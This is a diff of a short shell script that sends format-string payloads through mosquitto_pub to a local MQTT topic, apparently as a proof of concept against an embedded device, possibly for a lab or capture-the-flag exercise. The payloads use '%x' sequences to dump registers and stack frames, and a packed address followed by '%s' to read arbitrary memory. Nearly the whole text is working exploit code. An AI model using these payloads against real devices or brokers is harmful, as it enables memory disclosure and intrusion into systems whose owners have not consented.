@@ -7,19 +7,18 @@
 
 command_prefix="mosquitto_pub -h localhost -p 1883 -t /topic/qos0 -m"
 
-a1="a046fb3f"
-a2="44434241"
+tag_addr="e82f403f"
 
 nl_bin=$(echo "0a0d" | xxd -p -r)
 
-a1_bin=$(echo $a1 | xxd -p -r)
-a2_bin=$(echo $a2 | xxd -p -r)
+tag_addr_bin=$(echo $tag_addr | xxd -p -r)
 
 # Reading the stack
+$command_prefix "READING THE STACK:"
 $command_prefix "$nl_bin \
     Registers A13 - A15: %x %x %x $nl_bin \
     Stack frame: %x %x %x %x %x"
 
-
-# mosquitto_pub -h localhost -p 1883 -t \
-    # "/topic/qos0" -m "$a1_bin$a2_bin %x %x %20x %x %x"
+# Reading arbitrary memory
+$command_prefix "READING ARIBTRARY MEMORY:"
+$command_prefix "$tag_addr_bin %x %x %x %s"
